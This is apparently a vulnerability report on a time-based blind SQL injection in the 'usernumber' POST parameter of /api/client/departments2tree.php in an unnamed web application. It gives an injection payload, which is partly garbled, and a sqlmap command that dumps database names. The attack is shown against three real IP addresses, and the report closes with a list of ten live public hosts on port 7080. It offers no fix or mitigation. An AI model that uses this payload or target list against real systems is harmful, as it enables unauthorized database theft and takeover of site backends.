 

**Vulnerability hazards:**

Attackers can use this vulnerability to obtain all information in the database and enter the background of the website

**Vulnerability details:**

Case number one:

http://39.100.117.243:7080

![img](https://raw.githubusercontent.com/jm1913/vulns/main/clip_image002.jpg)

There are points of SQL injection

http://39.100.117.243:7080/api/client/departments2tree.php

The parameter usernumber submitted by POST on this page has time blind injection

 

Payload:

addr=&content=&enddate=&executor=&file1=&filetype1=&fileurl=&lang=zh&priority=&relevanter=&sign=69528b7d5fec328f9b25fb1c0a67b2f8&startdate=×tamp=1670555316267&title=&userelnumber=100101*sep/from(sel** union/**/select+1)='

 

See the attachment for the request packet

python sqlmap.py -r 1.txt -p usernumber --dbs --batch

Successfully ran out of the library name

![img](https://raw.githubusercontent.com/jm1913/vulns/main/clip_image004.jpg)

Case two:

http://58.20.99.190:7080/![img](https://raw.githubusercontent.com/jm1913/vulns/main/clip_image005.jpg)

There are points of SQL injection

http://58.20.99.190:7080/api/client/departments2tree.php

The parameter usernumber submitted by POST on this page has time blind injection

 

Payload:

addr=&content=&enddate=&executor=&file1=&filetype1=&fileurl=&lang=zh&priority=&relevanter=&sign=69528b7d5fec328f9b25fb1c0a67b2f8&startdate=×tamp=1670555316267&title=&userelnumber=100101*sep/from(sel** union/**/select+1)='

 

See the attachment for the request packet

python sqlmap.py -r 1.txt -p usernumber --dbs --batch

Successfully ran out of the library name

![img](https://raw.githubusercontent.com/jm1913/vulns/main/clip_image007.jpg)

Case three:

http://218.93.5.78:7080/![img](https://raw.githubusercontent.com/jm1913/vulns/main/clip_image008.jpg)

There are points of SQL injection

http://218.93.5.78:7080/api/client/departments2tree.php

The parameter usernumber submitted by POST on this page has time blind injection

 

Payload:

addr=&content=&enddate=&executor=&file1=&filetype1=&fileurl=&lang=zh&priority=&relevanter=&sign=69528b7d5fec328f9b25fb1c0a67b2f8&startdate=×tamp=1670555316267&title=&userelnumber=100101*sep/from(sel** union/**/select+1)='

 

See the attachment for the request packet

python sqlmap.py -r 1.txt -p usernumber --dbs --batch

Successfully ran out of the library name

![img](https://raw.githubusercontent.com/jm1913/vulns/main/clip_image010.jpg)

 

 

 

**case:**

http://39.100.117.243:7080

http://58.20.99.190:7080/

http://218.93.5.78:7080/

http://222.75.56.190:7080/

http://113.98.58.59:7080/

http://117.157.231.160:7080/

http://144.123.175.94:7080/

http://221.11.18.165:7080/

http://58.213.102.206:7080/

http://120.224.213.22:7080/

 
